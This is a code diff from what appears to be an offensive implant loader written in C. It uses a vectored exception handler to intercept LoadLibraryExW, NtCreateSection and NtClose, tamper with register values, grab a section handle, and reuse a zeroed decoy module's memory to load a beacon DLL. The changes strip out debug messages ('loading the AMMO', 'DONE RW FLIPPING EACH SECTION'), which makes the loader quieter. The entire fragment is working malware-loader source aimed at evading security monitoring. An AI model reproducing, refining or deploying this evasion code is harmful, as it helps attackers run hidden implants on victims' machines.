@@ -82,7 +82,6 @@ void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY
     dll_memory->Count = section_count;
 }
 DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* format, ...);
-DECLSPEC_IMPORT int __cdecl MSVCRT$getchar(void);
 
 
 pSacData g_SacData;
@@ -94,15 +93,12 @@ LONG VectoredHandleree(PEXCEPTION_POINTERS ExceptionInfo) {
 
         
         if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)KERNEL32$LoadLibraryExW) {
-            MSVCRT$printf("[*] Hit LoadLibraryExW, loading the AMMO!\n");
             g_SacData->Loaded = TRUE;
-            
         }
 
 
         if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)NTDLL$NtCreateSection) {
             if(g_SacData->Loaded) {
-                MSVCRT$printf("[*] Hit NtCreateSection!\n");
                 ExceptionInfo->ContextRecord->Rdx = 0x10000000 | 0xF001F;
                 
             }
@@ -113,7 +109,6 @@ LONG VectoredHandleree(PEXCEPTION_POINTERS ExceptionInfo) {
                 
                 g_SacData->pSacHandle = (HANDLE)ExceptionInfo->ContextRecord->Rcx;
                 ExceptionInfo->ContextRecord->Rcx = 0;
-                MSVCRT$printf("[*] Got handle from NtClose : %p\n", g_SacData->pSacHandle);
                 ExceptionInfo->ContextRecord->EFlags &= ~0x100;
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
@@ -171,7 +166,6 @@ void go ( )
     IMPORTFUNCS funcs;
     funcs.LoadLibraryA   = LoadLibraryA;
     funcs.GetProcAddress = GetProcAddress;
-    MSVCRT$printf("[*] Wait - this could take a minute\n");
     typedef PVOID (WINAPI* fn_AddVEH)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
     g_SacData = MSVCRT$calloc(1, sizeof(_SacData));
     if(!g_SacData){
@@ -257,7 +251,6 @@ void go ( )
         }
     }
 
-    dprintf("[*] DONE RW FLIPPING EACH SECTION %p \n", (PVOID)hDecoy_dst);
     NTDLL$memset(hDecoy_dst, 0, becSize); //zero it out for the beacon
 
     LoadDLL ( &dll_data, dll_src, hDecoy_dst );
